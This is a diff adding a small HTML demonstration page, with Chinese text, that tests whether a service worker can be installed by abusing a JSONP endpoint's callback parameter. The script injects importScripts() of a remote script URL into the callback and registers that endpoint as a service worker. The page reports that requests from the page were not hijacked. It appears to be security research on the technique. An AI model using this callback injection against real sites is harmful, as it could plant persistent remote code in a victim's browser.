@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <script src="lib/jquery.js"></script>
+</head>
+<body>
+  <h1>子目录 JSONP 接口作为 SW 脚本</h1>  
+  <p>JSONP 返回值: <input id="txtResult"></p>
+  <p>
+    打开控制台，观察 JSONP 的返回内容，是否有注入的 JS 代码。
+  </p>
+  <p>
+    可见，通过 api/getData.php 安装的 SW，是无法劫持页面发出的 JSONP 请求的，尽管它们的路径相同。
+  </p>
+  <script>
+    // 使用子目录的 JSONP 接口作为 SW 脚本
+    let key = 'importScripts("https://etherdream.com/sw-test/sw.js"),'
+    let url = 'api/getData.php?callback=' + encodeURIComponent(key)
+
+    navigator.serviceWorker.register(url);
+
+    // 请求子目录的 JSONP
+    function update() {
+      $.ajax({
+        url: 'api/getData.php',
+        dataType: 'jsonp',
+        success: function(result) {
+          $('#txtResult').val(result);
+        }
+      });
+    }
+    update();
+    setInterval(update, 1000);
+  </script>
+</body>
+</html>
